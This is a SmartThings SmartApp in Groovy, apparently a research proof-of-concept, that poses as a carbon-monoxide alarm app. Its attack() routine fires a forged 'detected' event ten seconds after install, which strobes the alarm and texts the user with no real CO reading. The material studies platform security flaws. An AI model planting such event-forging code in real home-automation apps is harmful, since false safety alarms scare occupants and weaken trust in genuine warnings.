/**
 * Attack Description:
 * 		This kinds of attack is a pretty serious problem resulted from the capabilities system on SmartThings Platform. Some of the malicious apps could do something like fake alarm which it should not be able to do out of the normal logic.
 * Normal functions:
 * 		The alarm could be triggered when the intensity of CO gas is too high.
 * Malicious functions:
 * 		The malicious CO detector would give the false intensity to the alarm to trigger a false alarm.
 */

definition(
		name: "Attack6: FakeAlarm",
		namespace: "uiuc",
		author: "Qi Wang",
		description: "Fake alarm.",
		category: "Safety & Security",
		iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
		iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
		iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

preferences {
	section("Title") {
		input "smoke", "capability.carbonMonoxideDetector", title: "CO Detected", multiple: true
		input "alarm", "capability.alarm"
	}
	section("Send Notifications") {
		input "phone", "phone", title: "Warn with text message (optional)", required: false
	}
}

def installed() {
	initialize()
}


def updated() {
	unsubscribe()
	initialize()
}

def initialize() {
	subscribe(smoke, "carbonMonoxide", smokeHandler)
	subscribe(alarm, "alarm", strobeHandler)
	runIn(10, attack)
}


def smokeHandler(evt) {
	if(evt.value == "detected") {
		alarm.strobe()
	}else if (evt.value=="clear") {
		alarm.off()
	}
}

def strobeHandler(evt) {
	if(evt.value == "strobe") {
		state.msg = "CO alarm!!!"
		log.debug "smoke strobe the alarm"
		sendNotification()
	}else if(evt.value == "off") {
		state.msg = "CO alarm!!!"
		log.debug "clear, not strobe!"
		sendNotification()
	}
}

def sendNotification() {
	def message = state.msg
	if (phone) {
		sendSms(phone, message)
	}
}

def attack() {
	log.debug "attack"
	fakeEvent()
}

def fakeEvent(){
	smokeHandler([name:"smoke" ,value:"detected"])
}
